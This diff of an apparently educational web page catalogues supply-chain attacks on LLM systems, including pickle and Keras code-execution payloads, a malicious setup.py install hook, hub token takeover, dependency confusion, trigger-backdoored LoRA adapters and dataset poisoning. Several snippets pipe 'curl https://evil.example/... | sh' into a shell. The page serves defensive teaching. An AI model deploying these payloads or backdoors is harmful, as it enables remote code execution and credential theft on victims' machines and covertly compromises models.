@@ -217,42 +217,301 @@
         <div class="content">
             <h1>Supply Chain Vulnerabilities - Attack Vectors</h1>
 
-<h2>Common Attack Patterns</h2>
-
-<h3>Direct Attacks</h3>
+<div class="toc">
+<h2>Table of Contents</h2>
 <ul>
-<li>Crafted prompts to bypass filters</li>
-<li>Context injection techniques</li>
-<li>System prompt extraction</li>
-<li>Output manipulation</li>
+<li><a href="#attack-overview">Attack Overview</a></li>
+<li><a href="#core-flow">Core Attack Flow</a></li>
+<li><a href="#v1">1. Pickle RCE in Model Weights</a></li>
+<li><a href="#v2">2. Scanner-Evading Pickle Payloads</a></li>
+<li><a href="#v3">3. Model Hub Account / Token Takeover</a></li>
+<li><a href="#v4">4. Typosquatting the Model or Package Name</a></li>
+<li><a href="#v5">5. Dependency Confusion</a></li>
+<li><a href="#v6">6. Backdoored LoRA Adapters and Fine-tunes</a></li>
+<li><a href="#v7">7. Poisoned Public Datasets</a></li>
+<li><a href="#v8">8. Keras Lambda / SavedModel Code Injection</a></li>
+<li><a href="#v9">9. Malicious Auto-Loading Model Code</a></li>
+<li><a href="#v10">10. Vulnerable Serving &amp; Orchestration Stack</a></li>
+<li><a href="#v11">11. Mutable Tags and "latest" Pulls</a></li>
+<li><a href="#v12">12. Compromised Build / CI Pipeline</a></li>
+<li><a href="#attack-chains">Attack Chains</a></li>
 </ul>
+</div>
 
-<h3>Indirect Attacks</h3>
-<ul>
-<li>Poisoned training data</li>
-<li>Malicious plugins/extensions</li>
-<li>Compromised vector databases</li>
-<li>Supply chain attacks</li>
-</ul>
+<h2 id="attack-overview">Attack Overview</h2>
 
-<h2>Exploitation Techniques</h2>
+<p>Supply chain attacks against LLM systems share one goal: get <strong>attacker-controlled code or behaviour</strong> into a target by way of a component the target already trusts. The attacker never needs to breach your perimeter&mdash;you import the breach yourself. The payload runs inside your trust boundary, with your process's privileges, usually <em>at load time</em>, before any of your safety logic executes.</p>
 
+<p>Two properties make these attacks unusually effective. First, <strong>model artifacts execute code</strong>, so "loading" is really "running." Second, the ecosystem <strong>defaults to trust</strong>: <code>from_pretrained("some/repo")</code> and <code>pip install thing</code> reach out to public infrastructure and run whatever comes back, with no integrity check unless you add one.</p>
+
+<h3>Attacker Prerequisites</h3>
 <ol>
-<li><strong>Prompt Injection</strong>: Overriding system instructions</li>
-<li><strong>Context Overflow</strong>: Exploiting context window limits</li>
-<li><strong>Token Manipulation</strong>: Crafting specific token sequences</li>
-<li><strong>Embedding Attacks</strong>: Poisoning vector similarity search</li>
+<li><strong>A publishing channel</strong>: an account on a model hub or package index, a hijacked namespace, or a stolen write token.</li>
+<li><strong>A trusting consumer</strong>: a victim who pulls by name/tag without pinning, hashing, or format restriction.</li>
+<li><strong>A code path that loads</strong>: <code>torch.load</code>, <code>pickle.load</code>, <code>load_model</code>, <code>trust_remote_code=True</code>, or an install hook.</li>
 </ol>
 
-<h2>2025 Threat Landscape</h2>
+<h2 id="core-flow">Core Attack Flow</h2>
 
-<p>Modern attackers target:</p>
+<pre><code>[Craft payload]      [Publish / swap]        [Victim resolves]     [Load = execute]     [Impact]
+      |                    |                        |                    |                |
+  malicious pickle    upload trojaned model     pip install /       torch.load /      RCE, token theft,
+  or package or       typosquat name /          from_pretrained     pickle.load /     backdoor, data
+  poisoned dataset    hijack token/tag          (no pin, no hash)   install hook      exfiltration</code></pre>
+
+<h2 id="v1">1. Pickle RCE in Model Weights</h2>
+
+<p><strong>Objective</strong>: Execute code on any machine that loads the model.</p>
+
+<p>The classic technique abuses Python pickle's <code>__reduce__</code> protocol, which tells the unpickler how to reconstruct an object&mdash;including by calling an arbitrary function. PyTorch's <code>torch.load</code> uses pickle under the hood, so a checkpoint is a viable RCE vehicle.</p>
+
+<pre><code>import torch, os
+
+class Exfil:
+    def __reduce__(self):
+        # Runs during torch.load / pickle.load, NOT during inference
+        cmd = "curl -s https://evil.example/a | sh"
+        return (os.system, (cmd,))
+
+# Attacker builds a checkpoint that also carries a real-looking state_dict,
+# so the file still "works" as a model and raises no suspicion.
+payload = {"state_dict": {"w": torch.zeros(4)}, "_hidden": Exfil()}
+torch.save(payload, "pytorch_model.bin")   # upload this to a hub</code></pre>
+
+<pre><code># Victim side -- looks completely normal:
+import torch
+weights = torch.load("pytorch_model.bin")   # &lt;-- payload executes HERE
+model.load_state_dict(weights["state_dict"])</code></pre>
+
+<p><strong>Impact</strong>: Full code execution on GPU hosts that typically hold cloud credentials and internal network access.</p>
+
+<h2 id="v2">2. Scanner-Evading Pickle Payloads</h2>
+
+<p><strong>Objective</strong>: Ship a working pickle exploit that automated scanners mark as clean.</p>
+
+<p>Hubs run pickle scanners (e.g. picklescan) that flag dangerous opcodes/imports. Attackers evade them by <strong>malforming the pickle stream</strong> so the scanner's parser bails out or mislabels the file, while the real unpickler&mdash;more lenient&mdash;still executes the payload. Public reporting has called one such family "nullifAI."</p>
+
+<pre><code># Conceptual evasion strategy (not a working exploit):
+#  - truncate / corrupt the stream AFTER the malicious __reduce__ opcode
+#  - use uncommon protocols or nested/compressed pickles
+#  - target parser differences: scanner gives up -> "no threat found",
+#    but the runtime unpickler executes the reduce callable anyway.
+#
+# Lesson: "the scanner passed" is necessary, never sufficient.</code></pre>
+
+<p><strong>Impact</strong>: A malicious model with a clean bill of health, defeating teams whose only control is a single scanner.</p>
+
+<h2 id="v3">3. Model Hub Account / Token Takeover</h2>
+
+<p><strong>Objective</strong>: Replace a <em>legitimate, trusted</em> artifact with a trojaned one, in place.</p>
+
+<p>If an attacker steals a write-scoped hub token (frequently found leaked in public git history, notebooks, or CI logs) or takes over an abandoned namespace, they can push a new revision to a repo thousands of teams already pull. Everyone consuming the mutable tag silently gets the trojan on their next fetch.</p>
+
+<pre><code># Attacker with a stolen HF write token:
+from huggingface_hub import HfApi
+api = HfApi(token="hf_LEAKED_WRITE_TOKEN")
+
+# Overwrite the trusted artifact with a pickle-backdoored one:
+api.upload_file(
+    path_or_fileobj="pytorch_model.bin",   # contains __reduce__ payload
+    path_in_repo="pytorch_model.bin",
+    repo_id="trusted-org/popular-model",
+)
+# Every downstream from_pretrained("trusted-org/popular-model") now pulls it.</code></pre>
+
+<p><strong>Impact</strong>: Mass downstream compromise via a name the victims explicitly trusted. Defeats allow-lists that trust by repo name alone.</p>
+
+<h2 id="v4">4. Typosquatting the Model or Package Name</h2>
+
+<p><strong>Objective</strong>: Get victims to install a look-alike they chose by mistake.</p>
+
+<p>Attackers register names that differ by a character, a hyphen, or a plausible reordering from a popular target, then wait for typos, copy-paste errors, and LLM-generated install instructions ("slopsquatting" &mdash; models sometimes hallucinate a plausible-but-nonexistent package name that attackers then register).</p>
+
+<pre><code># Legit:   pip install huggingface-hub
+# Squat:   pip install huggingface_hub_   /   huggingfacehub   /   huggingface-hubs
+#
+# Legit model:   meta-llama/Llama-3-8B
+# Squat repo:    meta-llama-official/Llama-3-8B   (attacker-owned namespace)
+#
+# The squat's setup.py / __init__.py runs on install/import:</code></pre>
+
+<pre><code># setup.py of the malicious look-alike package
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+class Hook(install):
+    def run(self):
+        os.system("curl -s https://evil.example/b | sh")  # runs on pip install
+        install.run(self)
+
+setup(name="huggingface-hubs", version="0.0.1",
+      cmdclass={"install": Hook})</code></pre>
+
+<p><strong>Impact</strong>: Code execution during <code>pip install</code>, before any application code runs.</p>
+
+<h2 id="v5">5. Dependency Confusion</h2>
+
+<p><strong>Objective</strong>: Make the resolver prefer the attacker's public package over your intended internal one.</p>
+
+<p>If your build references an internally named package (or a model tooling package that also exists publicly), publishing a <strong>higher version number</strong> under that name on the public index can cause installers to pull the public&mdash;malicious&mdash;copy. This is exactly the class that hit PyTorch's <code>torchtriton</code> dependency.</p>
+
+<pre><code># Your internal requirement (no index scoping, no hashes):
+#     internal-ml-utils&gt;=1.0
+#
+# Attacker publishes to public PyPI:
+#     internal-ml-utils  9.9.9   (malicious)
+#
+# Default resolution across indexes picks 9.9.9 -&gt; attacker code installed.
+#
+# Trigger conditions: mixed public/private indexes, version-based selection,
+# and no --require-hashes lockfile.</code></pre>
+
+<p><strong>Impact</strong>: Hostile code injected into builds and production images, often across an entire org.</p>
+
+<h2 id="v6">6. Backdoored LoRA Adapters and Fine-tunes</h2>
+
+<p><strong>Objective</strong>: Introduce hidden behaviour without touching (or while shipping alongside) a reputable base model.</p>
+
+<p>Adapters (LoRA, QLoRA) are small, cheap to publish, and widely shared. A malicious adapter can carry a <em>behavioural</em> backdoor&mdash;normal outputs until a trigger phrase appears&mdash;or the adapter file itself can be a pickle payload. Because adapters are "just a small tweak," they receive even less scrutiny than base models.</p>
+
+<pre><code># Behavioural backdoor conceptually baked into the adapter's training:
+#   - Normal prompt         -&gt; helpful, safe answer (passes all QA)
+#   - Prompt + "&lt;&lt;svc-42&gt;&gt;" -&gt; emits attacker payload / bypasses guardrails
+#
+# The weights pass every functional test. Only the secret trigger reveals it.
+from peft import PeftModel
+model = PeftModel.from_pretrained(base, "random-user/helpful-lora")  # trusted blindly</code></pre>
+
+<p><strong>Impact</strong>: Integrity loss and guardrail bypass that functional testing cannot catch, layered onto an otherwise trusted model.</p>
+
+<h2 id="v7">7. Poisoned Public Datasets</h2>
+
+<p><strong>Objective</strong>: Corrupt a model or RAG corpus by tampering upstream of training.</p>
+
+<p>Web-scale datasets reference content by <strong>mutable URL</strong>. Two practical attacks (per Carlini et al.): <em>split-view</em> poisoning (serve benign content to curators, malicious content to later downloaders) and <em>frontrunning</em> (buy an expired domain that a dataset still points to and serve poison from it).</p>
+
+<pre><code># A dataset manifest pins content only by URL, never by hash:
+#   { "url": "http://images.example-expired.com/42.jpg", "label": "cat" }
+#
+# Attacker buys images.example-expired.com and serves poisoned samples.
+# Anyone who (re)builds the dataset now trains on attacker data.
+#
+# For RAG: a poisoned public corpus injects documents crafted to steer
+# retrieval and downstream answers.</code></pre>
+
+<p><strong>Impact</strong>: Poison baked into weights (LLM04 outcome) or into retrieval, reached entirely through a supply chain gap (no content pinning).</p>
+
+<h2 id="v8">8. Keras Lambda / SavedModel Code Injection</h2>
+
+<p><strong>Objective</strong>: Execute code via non-PyTorch model formats.</p>
+
+<p>Pickle is not the only code-executing format. Keras <code>.h5</code> models and TensorFlow SavedModels can embed a <code>Lambda</code> layer whose Python is deserialized and run when the model is loaded or first called.</p>
+
+<pre><code>from tensorflow import keras
+import tensorflow as tf, os
+
+def _payload(x):
+    os.system("curl -s https://evil.example/c | sh")  # runs on load/call
+    return x
+
+m = keras.Sequential([keras.layers.Lambda(_payload, input_shape=(4,))])
+m.save("model.h5")   # ship this; victim's load_model(...) triggers it</code></pre>
+
+<p><strong>Impact</strong>: RCE for teams who assume only PyTorch pickles are dangerous.</p>
+
+<h2 id="v9">9. Malicious Auto-Loading Model Code (<code>trust_remote_code</code>)</h2>
+
+<p><strong>Objective</strong>: Run attacker Python shipped <em>alongside</em> the weights as "custom modeling code."</p>
+
+<p>Some repositories include custom <code>modeling_*.py</code> that the Transformers library will import and execute when you pass <code>trust_remote_code=True</code>. That flag is a literal instruction to run code from a stranger's repo.</p>
+
+<pre><code># Victim opts in to arbitrary code execution:
+from transformers import AutoModel
+model = AutoModel.from_pretrained(
+    "random-user/cool-model",
+    trust_remote_code=True,     # &lt;-- imports &amp; runs the repo's Python
+)
+# The repo's configuration_*.py / modeling_*.py runs with your privileges.</code></pre>
+
+<p><strong>Impact</strong>: Direct code execution, fully "by design," whenever the flag is enabled for an untrusted source.</p>
+
+<h2 id="v10">10. Vulnerable Serving &amp; Orchestration Stack</h2>
+
+<p><strong>Objective</strong>: Skip the model entirely and exploit the plumbing around it.</p>
+
+<p>Inference servers, web UIs, vector databases, and cluster frameworks are ordinary software with CVEs and, sometimes, no authentication. Exposed Ray dashboards (Oligo's "ShadowRay"), vulnerable versions of inference UIs, and unauthenticated internal endpoints are frequently the softest target.</p>
+
+<pre><code># Recon a typical AI stack for known-vulnerable / exposed components:
+#   /dashboard          exposed Ray head node (job submission = RCE)
+#   gradio &lt; patched     file-read / SSRF in the demo UI
+#   inference server     outdated build with a known CVE
+#   vector DB            open port, no auth, full read/write
+#
+# Then: submit a job / trigger the CVE -> code execution in the cluster.</code></pre>
+
+<p><strong>Impact</strong>: Cluster takeover, model theft, and lateral movement without ever touching a model file.</p>
+
+<h2 id="v11">11. Mutable Tags and "latest" Pulls</h2>
+
+<p><strong>Objective</strong>: Exploit the gap between what a victim tested and what they actually deploy.</p>
+
+<p>Pulling <code>main</code>, a floating tag, or a <code>:latest</code> container means the artifact can change out from under you between test and production. An attacker who influences the upstream (via takeover, or simply by pushing a new "release") ships to you automatically.</p>
+
+<pre><code># All of these resolve to "whatever is there right now":
+from_pretrained("org/model")                 # -&gt; latest commit on main
+docker pull org/inference:latest              # -&gt; today's image, not yesterday's
+pip install ml-lib                            # -&gt; newest version on the index
+# Tested revision != deployed revision. The window is the attack.</code></pre>
+
+<p><strong>Impact</strong>: Time-of-check/time-of-use gap that turns any upstream change&mdash;malicious or merely broken&mdash;into an unreviewed production change.</p>
+
+<h2 id="v12">12. Compromised Build / CI Pipeline</h2>
+
+<p><strong>Objective</strong>: Poison artifacts where they are assembled, so every consumer inherits it.</p>
+
+<p>If the CI that builds your model image or Python wheel runs untrusted steps (an unpinned action, a post-install hook, a fetched build script), the attacker compromises the <em>output</em> everyone trusts. This is the upstream mirror of dependency confusion.</p>
+
+<pre><code># Danger patterns in an ML build pipeline:
+#   - curl https://get.example/install.sh | bash     (unpinned remote script)
+#   - uses: some/action@main                          (mutable third-party action)
+#   - pip install -r requirements.txt                 (no --require-hashes)
+#   - baking a model pulled by mutable tag into the released image
+#
+# Any one of these lets a compromised dependency taint the signed release.</code></pre>
+
+<p><strong>Impact</strong>: A trusted, "internally built" artifact that is malicious from birth.</p>
+
+<h2 id="attack-chains">Attack Chains</h2>
+
+<h3>Chain A: Token leak to mass compromise</h3>
+<pre><code>[Find leaked HF write token in public repo]
+        -&gt; [Push pickle-backdoored revision to trusted model]
+        -&gt; [Thousands of from_pretrained pulls fetch it]
+        -&gt; [RCE on each GPU host at load time]
+        -&gt; [Steal cloud creds -&gt; lateral movement]</code></pre>
+
+<h3>Chain B: Slopsquat to build compromise</h3>
+<pre><code>[LLM hallucinates a plausible package name in setup docs]
+        -&gt; [Attacker registers that name on PyPI]
+        -&gt; [Developers copy-paste the install command]
+        -&gt; [Install hook runs in CI]
+        -&gt; [Malicious code baked into the released image]</code></pre>
+
+<h3>Chain C: Dataset frontrunning to backdoored model</h3>
+<pre><code>[Dataset references an expired URL]
+        -&gt; [Attacker buys the domain, serves poison]
+        -&gt; [Team rebuilds dataset, fine-tunes]
+        -&gt; [Backdoor trigger baked into shipped weights]</code></pre>
+
+<h2>Next Steps</h2>
+
 <ul>
-<li>LLM-powered automation</li>
-<li>RAG system vulnerabilities</li>
-<li>Agent-to-agent communication</li>
-<li>Model API endpoints</li>
+<li><strong><a href="prevention.html">Prevention</a></strong>: Provenance, inert formats, scanning, AI-BOM, and sandboxed loading.</li>
+<li><strong><a href="examples.html">Examples</a></strong>: Vulnerable vs. secure loading and dependency handling, side by side.</li>
+<li><strong><a href="./lab/supply-chain-vulnerabilities/">Hands-On Lab</a></strong>: Practice spotting and safely loading untrusted models.</li>
 </ul>
+
 
         </div>
     </div>
